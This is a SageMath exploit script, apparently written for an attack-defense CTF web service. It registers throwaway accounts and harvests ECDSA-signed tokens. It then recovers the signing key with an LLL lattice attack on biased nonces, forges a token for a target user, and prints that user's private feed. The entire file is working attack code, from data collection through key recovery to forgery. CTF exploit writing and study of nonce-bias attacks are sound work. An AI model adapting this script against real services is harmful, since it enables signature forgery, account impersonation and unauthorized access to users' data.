#!/usr/bin/env sage

import base64
import hashlib
import random
import re
import sys
import string
import requests
import urllib.parse

ip = sys.argv[1]
hint = sys.argv[2]

url = f'http://{ip}:4000'


def rnd_string(n=10):
    return ''.join([random.choice(string.ascii_letters) for _ in range(n)])


p, a, b, q, gx, gy = [
    0x1ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff,
    0x1fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc,
    0x51953eb9618e1c9a1f929a21a0b68540eea2da725b99b315f3b8b489918ef109e156193951ec7e937b1652c0bd3bb1bf073573df883d2c34f1ef451fd46b503f00,
    0x1fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffa51868783bf2f966b7fcc0148f709a5d03bb5c9b8899c47aebb6fb71e91386409,
    0xc6858e06b70404e9cd9e3ecb662395b4429c648139053fb521f828af606b4d3dbaa14b5e77efe75928fe1dc127a2ffa8de3348b3c1856a429bf97e7e31c2e5bd66,
    0x11839296a789a3bc0045c8a5fb42c7d1bd998f54449579b446817afbd17273e662c97ee72995ef42640c550b9013fad0761353c7086a272c24088be94769fd16650
]

Fp = GF(p)
Fq = GF(q)

E = EllipticCurve(Fp, [a, b])
G = E(gx, gy)


def attack(messages, signatures):
    # https://github.com/fortenforge/defconquals2018-official/
    n = min(len(messages), len(signatures))

    T, U = [], []

    for h, (r, s) in zip(messages, signatures):
        T.append(int(r / s))
        U.append(int(-h / s))

    T, U = vector(T), vector(U)

    sT, sU = 1, 1

    vT = vector([0] * n + [sT, 0])
    vU = vector([0] * n + [0, sU])

    '''
            [           | |   | ]
            [    q*I    | 0   0 ]
            [           | |   | ]
        M = [-----------+-------]
            [ --- T --- | sT  0 ]
            [ --- U --- | 0  sU ]
    '''

    M = (q * matrix.identity(n)) \
        .stack(T) \
        .stack(U) \
        .augment(vT) \
        .augment(vU)

    B = M.LLL()

    for i, v in enumerate(B):
        if v[-1] == sU:
            x = int(-v[-2] / sT)
            return x % q


def check_public(Q, messages, signatures):
    for h, (r, s) in zip(messages, signatures):
        R = int(h / s) * G + int(r / s) * Q
        x, y = R.xy()
        if int(x) != int(r):
            return False
    return True


def recover_public(messages, signatures):
    for h, (r, s) in zip(messages, signatures):
        R = E.lift_x(Fp(r))
        Q = int(-h / r) * G + int(s / r) * R
        if check_public(Q, messages, signatures):
            return Q


def forge_token(message, x):
    hash_ = int.from_bytes(hashlib.sha384(message.encode()).digest(), 'big')

    k = 31337
    r = Fq((k * G).xy()[0])
    s = Fq(x * r + hash_) / Fq(k)

    r, s = map(int, (r, s))

    rb = r.to_bytes((r.bit_length() + 7) // 8, 'big')
    sb = s.to_bytes((s.bit_length() + 7) // 8, 'big')

    data = rb + sb + bytes([len(rb), len(sb)])

    return base64.b64encode(data).decode()


def collect_messages_and_signs(n=10):
    messages, signatures = [], []

    for i in range(n):
        username = rnd_string()

        sess = requests.Session()

        resp = sess.post(f'{url}/register', data={'login': username, 'password': username})

        if resp.status_code != 200:
            print(resp.status_code)
            continue

        reg = re.compile(r'<a href=\"/subscribe\?user={}&token=([A-Za-z0-9-+=%/]+)\">'.format(username))

        home_resp = sess.get(f'{url}/home')
        if home_resp.status_code != 200:
            print(resp.status_code)
            continue
        toks = reg.findall(home_resp.text)
        if len(toks) != 1:
            continue

        hash_ = int.from_bytes(hashlib.sha384(username.encode()).digest(), 'big')
        messages.append(Fq(hash_))

        token = base64.b64decode(urllib.parse.unquote_plus(toks[0]))
        rl, sl = token[-2:]
        r = int.from_bytes(token[:rl], 'big')
        s = int.from_bytes(token[rl:rl + sl], 'big')
        signatures.append((Fq(r), Fq(s)))
        # break
    return messages, signatures


def get_latest_users():
    reg = re.compile(r'Review by ([A-Za-z0-9]+)')
    return reg.findall(requests.get(url + '/reviews').text)


messages, signatures = collect_messages_and_signs(10)

Q = recover_public(messages, signatures)

x = attack(messages, signatures)

assert x * G == Q

s = requests.Session()
resp = s.post(f'{url}/register', data={'login': rnd_string(), 'password': rnd_string()})
assert resp.status_code == 200
u = hint
resp = s.get(url + '/subscribe', params={'user': u, 'token': forge_token(u, x)})
if resp.status_code != 200:
    print(resp.text, flush=True)
resp = s.get(url + '/feed')
print(resp.text, flush=True)
